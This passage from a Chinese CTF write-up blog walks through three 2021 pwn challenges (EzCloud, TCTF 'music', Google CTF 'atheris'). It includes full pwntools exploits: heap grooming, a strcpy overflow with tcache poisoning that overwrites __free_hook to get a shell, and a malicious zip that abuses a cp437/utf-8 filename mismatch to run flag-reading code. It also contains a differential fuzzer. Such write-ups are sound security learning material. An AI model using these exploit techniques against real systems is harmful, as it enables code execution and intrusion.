sh.send(base.ljust(0x10000,'\\x00'))def login(id_u): base=\"POST /login HTTP/1.1\\r\\nContent-Length: 4096\\r\\nLogin-ID: %s\\r\\n\\r\\n\"%(id_u)+\"a\"*0x1000 sh.send(base.ljust(0x10000,'\\x00'))def logout(id_u): base=\"POST /logout HTTP/1.1\\r\\nLogin-ID: %s\\r\\nContent-Length: 0\\r\\n\\r\\n\"%(quote(id_u)) sh.send(base.ljust(0x10000,'\\x00'))sh=process('./EzCloud')login(\"1234\")add(\"1234\",\"a\"*0xf000,1)free(\"1234\",0)print('0')add(\"1234\",'a',0)print('1')show(\"1234\")sh.recvuntil(\"&lt;p&gt;\\r\\n&lt;p&gt;\")heap_addr=u64(sh.recv(6).ljust(8,'\\x00'))&amp;0xfffffffffffff000print(hex(heap_addr))login(\"12345\")for i in range(16): add(\"12345\",\"a\"*0x10,1) print(i)payload=\"a\"*0x60+p64(heap_addr+0x6210)+p64(0)+p64(1)+p64(heap_addr+0x6220)+\"1234567\\x00\"+p64(7)add(\"12345\",payload.ljust(0x110,'a'),1)base=\"GET /flag HTTP/1.1\\r\\nHost: 192.168.23.131:2333\\r\\nLogin-ID: 1234567\\r\\n\\r\\n\"sh.send(base.ljust(0x10000,'\\x00'))sh.interactive() 2. 2021tctf-music本题给了一个补丁，将premtx改成了可循环使用的菜单程序。premtx的功能是将mtx格式文件转换成pmx文件，菜单允许我们生成mtx文件，以及将mtx文件转换成pmx文件。 这个项目的源码中使用了大量的strcpy和sprintf，但由于编译保护的关系都无法进行利用，因此我比赛时完全忽略了strcpy，导致一直找不到洞，还是太菜了。实际上漏洞点是multfile.c文件里pushFile函数中的strcpy(newnode-&gt;actualfile_NAME, filename)，由于编译器无法推断newnode-&gt;actualfile_NAME的长度，自然也无法进行保护。 image-20210815164242464 泄露libc地址 查看手册可知，用include命令可以将任意文件包含到mtx文件中，然后开启debugMode就会输出文件的内容，造成任意文件读，当然我们不能读取flag文件，但我们可以读/proc/self/maps来泄露出libc地址。 堆风水 这题又需要使用堆风水构造出一个合适的布局，使得在一次转换中就能够实现堆块fd的改写与任意地址写。本题比上一题好的地方在于使用malloc与calloc的地方并不多，因此我们不需要靠玄学了。 总结一下可控的会使用alloc相关函数的地方有： multfile.c中的pushFile使用了malloc，分配堆块大小为0x1a0 两个菜单函数都使用了calloc fopen固定分配0x1e0大小的堆块 可控的free有： pushFile中打开文件失败时 multifile.c的popFile中 2个菜单函数的末尾 fclose 实际调试时发现还会分配一些大于0x1000的堆块，但是影响不大就没分析是哪分配的了。为了避免这个影响我们先利用菜单的upload功能calloc一个0x1000大小的堆块，紧接着upload就会调用fopen分配一个0x1e0大小的堆块，0x1e0会进入tcache，所以最终0x1000大小堆块会进入unsorted bin。 然后我们再分配一些0x1e0大小的堆块专门提供给fopen使用，免得之后mtx转换pmx时导致我们的堆块不相邻。 为了任意写，我们需要保证0x1a0大小堆块的分配顺序是按从低到高地址来的，这样才能够溢出改fd并分配出我们想要的地址。由于溢出点是actualfile_NAME字段，我们可以控制include一个超长名字的文件来触发，所以发生溢出的堆块是第二块，因此我们需要布置的0x1a0大小堆块数目为3+1。上述顺序正好匹配了栈的特点，构造一个深度为4的文件栈就能够布置好tcache。我们总共需要调用3次转换函数，第一次用于泄露libc地址。第一次转换后堆块布局如下图所示。 第二次用于篡改fd，文件栈的深度为2。 最后构造一个深度为4的文件栈即可改free_hook为one_gadget拿shell。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *#context.log_level='debug'def add(index,content): sh.sendafter(\"choice:\",'1') sh.sendafter('Index:',str(index)) sh.recvuntil('Your filename: ') file_name=sh.recvline()[:-1] sh.sendafter('length:',str(len(content))) sh.sendafter('content:',content) return file_namedef gen(index,if_libc,if_ok): sh.sendafter(\"choice:\",'2') sh.sendafter('Index:',str(index)) if(if_libc): res=sh.recvuntil('/usr/lib/x86_64-linux-gnu').split('\\n')[-1] libc_base=int(res[5:17],16) else: libc_base=None if(not if_ok): sh.sendafter('?[y/n]','y') return libc_basedef gen_f(index,path,size): content=\"\"\"Honky-Tonk: Voices RL LL AL BL CL DL EL FL GL HL IL JL; Clefs G F 1 2 3 4 5 6 7 8 9 10; ContinuoStyle: Honky-TonkName: PianoMeter: 4/4size: 29%% w120menable: ignoreErrorsenable: debugMode\"\"\" content+=\"include:%s\\n\\n\"%(path) c_len=len(content) while(c_len&lt;size): content+=\"g\"*14+\"|\\n\" c_len+=16 file_name=add(index,content) return file_namelib=ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')sh=process('./chall')#pause()#sh=remote('127.0.0.1',12580)#sh=remote('111.186.58.135',12580)f4=gen_f(4,'/bin/sh',0x1000)f0=gen_f(0,'/proc/self/maps',0x1d0)f1=gen_f(1,'./'+f0,0x1d0)f2=gen_f(2,'./'+f1,0x1d0)libc_base=gen(2,1,0)print(hex(libc_base))free_hook=libc_base+lib.sym['__free_hook']malloc_hook=libc_base+lib.sym['__malloc_hook']system_addr=libc_base+lib.sym['system']one_gadget=libc_base+0xe6e73payload='a'*142+p64(free_hook-0x120)[:6]payload2='/bin/sh;'+'a'*6+p64(one_gadget)[:6]gen_f(3,payload,0x250)gen(3,0,0)f5=gen_f(5,payload2,0x200)f6=gen_f(6,f5,0x200)gen_f(7,f6,0x200)gen(7,0,1)sh.interactive() 3. 2021googlectf-atheris本题是一个python写的服务器，它会接收一个zip压缩包。然后调用find_valid_autorun筛选出符合要求的py文件，随后运行它。 find_valid_autorun 先使用zipfile库获取压缩包的内容信息，依次进行如下检验： 文件名不能为空 文件名第一位不能为’/‘，也就是不能为绝对路径 文件名中不能包含’..’ 文件类型不能为链接文件 不能包含Xceed Unicode Extra Field 不能包含Unicode Path Extra Field 然后筛选出文件名以.autorun.py结尾的文件，然后获取.autorun.py前的87个字符，当成是base64编码后的签名，不是4的倍数是因为多取了一个’.’，再加上2个等号就是4的倍数了。若签名验证通过则会返回这个文件名。 解压运行 调用turbozipfile库解压zip压缩包，然后运行通过了检验的.autorun.py文件。 解题思路 通过readme可以猜测，漏洞位于turbozipfile库中。很显然不可能去分析二进制文件，结合题目名称可知必须通过fuzz定位漏洞，但我在比赛时瞎fuzz了很久都没有任何收获。赛后通过官方题解我又学到了一个新知识，差分fuzz是最适用于这种情况的，服务器中混用了2个功能类似的库，若他们的功能细节上存在些许不同就可能引发逻辑漏洞。编写差分fuzzer的思路也很普通，原先的libfuzzer是在fuzzer中调用待测库的函数，而差分fuzzer就是2个要比较的库的功能函数都调用，然后比较它们的结果有何不同，若是发现不同就抛出异常产生crash。以下是我照着官方fuzzer写的fuzzer。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import atheriswith atheris.instrument_imports(): import turbozipfile import zipfile import io import sys@atheris.instrument_funcdef comp(left, right): if type(left) == str and type(right) == bytes: return left.encode(\"utf-8\") == right if type(left) == bytes and type(right) == str: return left == right.encode(\"utf-8\") return left == right@atheris.instrument_funcdef TestOneInput(data): with io.BytesIO(data) as f: try: zf=zipfile.ZipFile(f) tf=turbozipfile.ZipFile(f) except Exception as e: return pinfos=zf.infolist() finfos=tf.infolist() if len(pinfos) != len(finfos): raise RuntimeError(\"Info length disagreement\") for i in range(len(pinfos)): pinfo=pinfos[i] finfo=finfos[i] if not comp(pinfo.comment,finfo.comment): raise RuntimeError(\"comment disagreement\") if pinfo.compress_size != finfo.compress_size: raise RuntimeError(\"comment size disagreement\") if pinfo.compress_type != finfo.compress_type: raise RuntimeError(\"compress type disagreement\") if pinfo.external_attr != finfo.external_attr: raise RuntimeError(\"external_attr disagreement\") if pinfo.extra != finfo.extra: raise RuntimeError(\"extra disagreement\") if pinfo.file_size != finfo.file_size: raise RuntimeError(\"file size disagreement\") if not comp(pinfo.filename,finfo.filename): raise RuntimeError(\"filename disagreement: &#123;&#125; &#123;&#125;\".format(pinfo.filename,finfo.filename)) if pinfo.flag_bits != finfo.flag_bits: raise RuntimeError(\"flag_bits disagreement\") if pinfo.header_offset != finfo.header_offset: raise RuntimeError(\"header_offset disagreement\") if pinfo.internal_attr != finfo.internal_attr: raise RuntimeError(\"internal_attr disagreement\") try: if pinfo.is_dir() != finfo.is_dir(): raise RuntimeError(\"is_dir disagreement\") except IndexError as e: pass if pinfo.reserved != finfo.reserved: raise RuntimeError(\"reserved disagreement\") if pinfo.volume != finfo.volume: raise RuntimeError(\"volume disagreement\") try: with zf.open(pinfo) as zf2: pdata=zf2.read() except Exception as e: return try: with tf.open(finfo) as tf2: fdata=tf2.read() except Exception as e: return if(fdata != pdata): raise RuntimeError(\"data disagreement\")atheris.Setup(sys.argv, TestOneInput)atheris.Fuzz() 很快就能够跑出crash，如下可以看出两个库在分析zip包中的文件时，获取的文件名可能会不同。 相比于没有源码的turbozipfile，我们去看看zipfile要更加可行。直接看获取文件名信息的函数，是ZipFile类中的_RealGetContent方法，可以看到有2种解码方式，再配合我们fuzz时显示的2个库提取的文件名都带有不同的特殊符号，那么就能知道问题很可能出在编码上。 为了验证这一点，我们将fuzz时显示的2个文件名分别进行cp437和utf-8的编码，可以看到得到了同样的数据。 1234n1=\"sample.YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob╧¿iWrqxZqgHCPX4Nyc6WAQ.autorun.py\"n2=\"sample.YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4obϨiWrqxZqgHCPX4Nyc6WAQ.autorun.py\"print(n1.encode('cp437'))print(n2.encode('utf-8')) 这说明turbozipfile和zipfile在提取文件名时的解码方式不同，turbozipfile使用utf-8，zipfile在flag &amp; 0x800为0时使用cp437。这意味着我们可以构造一个文件名p，它的末尾是base64编码的签名和autorun.py，并且使其在被cp437编码后还能被utf-8正常解码，调用zipfile将这个文件的名字写入到exp.zip中，这个文件的内容与sample的相同；第二个文件的名字则是由p经过utf-8编码再utf-8解码得到的，也使用zipfile写入到exp.zip中，它的内容是读取flag并打印。两个文件名都要utf-8解码的原因是zipfile在写入文件名时会进行一次utf-8编码。最后还要记得将生成的exp.zip中File header和Central directory file header中表示文件名编码的flag最高位改为0，这样zipfile才会使用cp437来解码。 exp的原理是文件一的名字被cp437解码后会得到p，由于它的内容与sample相同所以能够通过签名校验。此时find_valid_autorun返回，由turbozipfile解压缩，它使用utf-8解码文件一名字得到的不是p，而解码文件二名字时会得到p，因此它会运行文件二，读取并打印出flag。 exp 123456789101112131415161718192021222324252627282930313233343536import zipfileimport turbozipfilep='πü½πü╗πéô.'p=p+\"YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob1aiWrqxZqgHCPX4Nyc6WAQ.autorun.py\"print(p)z=zipfile.ZipFile('../exp.zip','w')f=z.open(p.encode('cp437').decode('utf-8'),'w')print(p.encode('cp437').decode('utf-8'))content=\"\"\"import osprint(\"Directory contents:\")for path in os.listdir('.'): if path == '.' or path == '..': continue if path.endswith(\".autorun.py\"): continue print(path)\"\"\"f.write(content.encode('utf-8'))f.close()f=z.open(p.encode('utf-8').decode('utf-8'),'w')content=\"\"\"file=open(\"/flag\")print(file.read())file.close()\"\"\"f.write(content.encode('utf-8'))f.close()z.close()zf=open(\"../exp.zip\",'rb')content=zf.read().replace(b'\\x14\\x00\\x00\\x08',b'\\x14\\x00\\x00\\x00')zf.close()zf=open(\"../exp.zip\",'wb')zf.write(content)zf.close() 4. 总结高质量Pwn题难点基本都在于发现漏洞，但我都是看过漏洞点后才复现出的，到头来练习的还只是漏洞利用啊。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://veltavid.github.io/tags/CTF/"}]}]